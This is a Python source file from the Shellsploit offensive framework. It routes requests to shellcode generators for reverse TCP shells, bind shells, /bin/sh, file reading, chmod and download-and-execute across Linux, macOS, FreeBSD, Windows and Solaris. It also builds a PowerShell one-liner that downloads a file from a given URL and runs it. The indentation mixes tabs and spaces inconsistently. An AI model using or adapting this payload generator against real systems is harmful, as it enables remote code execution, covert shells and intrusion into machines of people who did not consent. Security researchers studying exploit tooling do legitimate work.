#------------------Bombermans Team---------------------------------#
#Author  : B3mB4m
#Concat  : b3mb4m@protonmail.com
#Project : https://github.com/b3mb4m/Shellsploit
#LICENSE : https://github.com/b3mb4m/Shellsploit/blob/master/LICENSE
#------------------------------------------------------------------#

def generator( choose, shellcode, argv="None", argv2="None"):

	if choose == "linux_x86":
		if shellcode == "bin_sh":
			from Linux86.bin_shx86 import bin_shx86
			return bin_shx86()

		elif shellcode == "exec":
			from Linux86.execc import execc
			return execc( argv)

		elif shellcode == "read":
			from Linux86.readfilex86 import readx86
			from stackconvert import stackconvertSTR
			return readx86( stackconvertSTR(argv))

		elif shellcode == "download&exec":
			from Linux86.download import downloadANDexecute
			from stackconvert import stackconvertSTR
			filename = argv.split("/")[-1]
			return downloadANDexecute( stackconvertSTR(argv), stackconvertSTR(filename))

		elif shellcode == "chmod":
			from Linux86.chmod import ch
			from stackconvert import stackconvertSTR
			return ch( stackconvertSTR(argv))

		elif shellcode == "tcp_bind":
			from Linux86.tcp_bindx86 import tcp_bindx86
			from stackconvert import PORT
			return tcp_bindx86(  PORT(argv))

		elif shellcode == "reverse_tcp":
			from Linux86.reverse_tcpx86 import reverse_tcpx86
			from stackconvert import IP
			from stackconvert import PORT
			return reverse_tcpx86( IP(argv), PORT(argv2))
		elif shellcode == "cd_eject":
                        from Linux86.cd_eject import cd_eject
                        return cd_eject()

	elif choose == "linux_x64":
		if shellcode == "bin_sh":
			from Linux64.bin_shx64 import bin_shx64
			return bin_shx64()

		elif shellcode == "tcp_bind":
			from Linux64.tcp_bindx64 import tcp_bindx64
			from stackconvert import PORT
			return tcp_bindx64( PORT(argv))

		elif shellcode == "reverse_tcp":
			from Linux64.reverse_tcpx64 import reverse_tcpx64
			from stackconvert import IP
			from stackconvert import PORT
			return reverse_tcpx64( IP(argv), PORT(argv2))

		elif shellcode == "read":
			from Linux64.readfilex64 import readx64
			from stackconvert import plaintext
			return readx64( plaintext(argv))


	elif choose == "linux":
		from Linux.magic import merlin
		if shellcode == "bin_sh":
			from Linux86.bin_shx86 import bin_shx86
			from Linux64.bin_shx64 import bin_shx64
			value = hex(len(bin_shx86().split("\\x"))-1)[2:]
			value = "\\x{0}".format(value)
			return merlin( value)+bin_shx86()+bin_shx64()

		elif shellcode == "read":
			from Linux86.readfilex86 import readx86
			from Linux64.readfilex64 import readx64
			from stackconvert import stackconvertSTR
			from stackconvert import plaintext
			value = hex(len(readx86( stackconvertSTR(argv)).split("\\x"))-1)[2:]
			value = "\\x{0}".format(value)
			return merlin( value)+readx86( stackconvertSTR(argv))+readx64( plaintext(argv))

		elif shellcode == "reverse_tcp":
			from Linux64.reverse_tcpx64 import reverse_tcpx64
			from Linux86.reverse_tcpx86 import reverse_tcpx86
			from stackconvert import IP
			from stackconvert import PORT
			value = hex(len(reverse_tcpx86( IP(argv), PORT(argv2)).split("\\x"))-1)[2:]
			value = "\\x{0}".format(value)
			return merlin( value)+reverse_tcpx86( IP(argv), PORT(argv2))+reverse_tcpx64( IP(argv), PORT(argv2))

		elif shellcode == "tcp_bind":
			from Linux64.tcp_bindx64 import tcp_bindx64
			from Linux86.tcp_bindx86 import tcp_bindx86
			from stackconvert import PORT
			value = hex(len(tcp_bindx86( PORT(argv)).split("\\x"))-1)[2:]
			value = "\\x{0}".format(value)
			return merlin( value)+tcp_bindx86(  PORT(argv))+tcp_bindx64( PORT(argv))




	elif choose == "osx86":
		if shellcode == "tcp_bind":
			from OSX86.tcp_bind import tcp_bind
			from stackconvert import PORT
			return tcp_bind( PORT(argv))

		elif shellcode == "bin_sh":
			from OSX86.bin_sh import bin_sh
			return bin_sh()

		elif shellcode == "reverse_tcp":
			from OSX86.reverse_tcp import reverse_tcp
			from stackconvert import IP
			from stackconvert import PORT
			return reverse_tcp( IP(argv), PORT(argv2))

	elif choose == "osx64":
		if shellcode == "bin_sh":
			from OSX64.bin_sh import bin_sh
			return bin_sh()

		elif shellcode == "reverse_tcp":
			from OSX64.reverse_tcp import reverse_tcp
			from stackconvert import IP
			from stackconvert import PORT
			return reverse_tcp( IP(argv), PORT(argv2))

		elif shellcode == "tcp_bind":
			from OSX64.tcp_bind import tcp_bind
			from stackconvert import PORT
			return tcp_bind( PORT(argv))

	elif choose == "freebsd_x86":
		if shellcode == "bin_sh":
			from FreeBSDx86.bin_sh import bin_sh
			return bin_sh()


		elif shellcode == "read":
			from FreeBSDx86.read import read
			from stackconvert import plaintext
			return read(plaintext(argv))


		elif shellcode == "reverse_tcp":
			from FreeBSDx86.reverse_tcp import reverse_tcp
			from stackconvert import IP
			from stackconvert import PORT
			return reverse_tcp( IP(argv2), PORT(argv))


		elif shellcode == "reverse_tcp2":
			from FreeBSDx86.reverse_tcp2 import reverse_tcp2
			from stackconvert import IP
			from stackconvert import PORT
			return reverse_tcp2( IP(argv2), PORT(argv))

		elif shellcode == "tcp_bind":
			from FreeBSDx86.tcp_bind import tcp_bind
			if len(str(argv)) == 5:
				PORT = "\\x{0}\\x{1}".format(*(hex(int(argv))[2:][0:2],hex(int(argv))[2:][2:]))
			else:
				PORT = "\\x{0}\\x{1}".format(*("0"+hex(int(argv))[2:][0],hex(int(argv))[2:][1:]))
			return tcp_bind( PORT)

		elif shellcode == "exec":
			from FreeBSDx86.execc import execc
			from stackconvert import plaintext
			command = '/bin/sh -c {0}'.format(argv)
			return execc(plaintext(argv))

	elif choose == "freebsd_x64":
		if shellcode == "bin_sh":
			from FreeBSDx64.bin_sh import bin_sh
			return bin_sh()

		elif shellcode == "exec":
			from FreeBSDx64.execc import execc
			from stackconvert import plaintext
			command = '/bin/sh -c {0}'.format(argv)
			return execc(plaintext(argv))


		elif shellcode == "tcp_bind":
			from stackconvert import plaintext
			from stackconvert import PORT
			from FreeBSDx64.tcp_bind import tcp_bind
			return tcp_bind( PORT(argv), plaintext(argv2))

		elif shellcode == "reverse_tcp":
			from FreeBSDx64.reverse_tcp import reverse_tcp
			from stackconvert import IP
			from stackconvert import PORT
			return reverse_tcp( IP(argv), PORT(argv2))

	elif choose == "linux_arm":
		if shellcode == "chmod":
			from LinuxARM.chmod import chmod
			from stackconvert import plaintext
			if argv == "None":
				return "FILE PATH must be declared."
			else:
				return chmod( plaintext(argv))

		elif shellcode == "bin_sh":
			from LinuxARM.bin_sh import bin_sh
			return bin_sh()

		elif shellcode == "exec":
			from LinuxARM.execc import execc
			return execc( argv)

		elif shellcode == "reverse_tcp":
			from LinuxARM.reverse_tcp import reverse_tcp
			from stackconvert import IP
			from stackconvert import PORT
			return reverse_tcp( IP(argv2), PORT(argv))

	elif choose == "linux_mips":
		if shellcode == "reverse_tcp":
			from LinuxMIPS.reverse_tcp import reverse_tcp
			from stackconvert import IP
			from stackconvert import PORT
			return reverse_tcp( IP(argv), PORT(argv2))

		elif shellcode == "bin_sh":
			from LinuxMIPS.bin_sh import bin_sh
			return bin_sh()

                elif shellcode == "chmod":
			from LinuxMIPS.chmod import chmod
			from stackconvert import plaintext
			return chmod( plaintext(argv))

		elif shellcode == "tcp_bind":
			from LinuxMIPS.tcp_bind import tcp_bind
			from stackconvert import PORT
			return tcp_bind( PORT(argv))

	elif choose == "windows":
		if shellcode == "messagebox":
                        from Windows import messagebox
			from stackconvert import stackconvertSTR
			if argv == "None":
				return messagebox.messagebox( False)
			else:
				return messagebox.messagebox( stackconvertSTR(argv, True))

                elif shellcode == "downloadandexecute":
                        from Windows.downloadandexecute import downANDexecute
                        from stackconvert import rawSTR
                        from stackconvert import stackconvertSTR
                        if argv2 == "None":
                                argv2 = argv.split("/")[-1]
                        powershell = '''powershell -command "& { (New-Object Net.WebClient).DownloadFile('%s', '%s') ;(New-Object -com Shell.Application).ShellExecute('%s');}"''' % (argv, argv2, argv2)
                        return downANDexecute(payload=stackconvertSTR(powershell))


                elif shellcode == "exec":
                        from Windows.execc import WinExec
                        return WinExec(argv)

                elif shellcode == "tcp_bind":
                        from Windows.bind_tcp import PayloadModule
                        return PayloadModule( argv).gen_shellcode()

                elif shellcode	== "reverse_tcp":
                        from Windows.rev_tcp import PayloadModule
                        return PayloadModule( argv, argv2).gen_shellcode()


        elif choose == "solarisx86":
                        if shellcode == "read":
                                from Solarisx86.read import read
                                from stackconvert import plaintext
                                return read( plaintext(argv))
                        elif shellcode == "reverse_tcp":
                                from Solarisx86.reverse_tcp import reverse_tcp
                                from stackconvert import IP
                                from stackconvert import PORT
								#return reverse_tcp(host=IP(argv), port=PORT(argv2))
                                dombili = IP(argv)
                                kocakari = PORT(argv2)
                                return reverse_tcp(host=dombili, port=kocakari)

                        elif shellcode == "bin_sh":
                                from Solarisx86.bin_sh import bin_sh
                                return bin_sh()
                        elif shellcode == "tcp_bind":
                                from Solarisx86.tcp_bind import tcp_bind
                                from stackconvert import PORT
                                return tcp_bind( PORT(argv))
